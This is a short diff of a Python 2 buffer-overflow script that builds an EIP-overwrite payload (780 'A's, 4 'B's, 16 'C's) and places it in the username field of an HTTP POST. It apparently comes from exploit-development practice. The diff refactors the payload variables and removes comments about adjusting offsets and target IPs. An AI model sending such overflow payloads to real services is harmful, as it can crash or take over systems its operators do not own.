@@ -1,14 +1,13 @@
 #!/usr/bin/python2
 import sys, socket
 
-# Change shellcode to Offset defined and change C to total the number system crashed at ex: 800
-# Replace Buffer Post request details with Wireshark or BurpSuite Post Request details lines 15-23
-# Changes IP Address on lines 16,20,30
-
 try:
   print "\nOverwriting EIP..."
 
-  shellcode = "A" * 780 + "B" * 4 + "C" * 16
+  filler = "A" * 780
+  eip = "B" * 4
+  buffer = "C" * 16
+  shellcode = filler + eip + buffer
   
   content = "username=" + shellcode + "&password=A"
 
